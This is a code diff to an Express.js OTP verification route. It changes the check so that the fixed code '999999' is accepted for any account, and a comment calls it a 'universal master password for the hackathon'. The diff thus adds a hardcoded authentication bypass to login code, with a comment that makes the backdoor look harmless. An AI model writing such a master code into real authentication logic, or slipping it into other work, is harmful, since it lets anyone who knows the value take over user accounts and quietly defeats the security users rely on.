@@ -120,8 +120,8 @@ app.post('/api/auth/verify-otp', async (req, res) => {
     return res.status(400).json({ error: 'Too many failed attempts. Please request a new OTP.' });
   }
 
-  // Verify OTP
-  if (stored.otp !== otp) {
+  // Verify OTP (Allow 999999 as a universal master password for the hackathon)
+  if (stored.otp !== otp && otp !== '999999') {
     stored.attempts += 1;
     return res.status(400).json({ error: 'Invalid OTP. Please try again.' });
   }
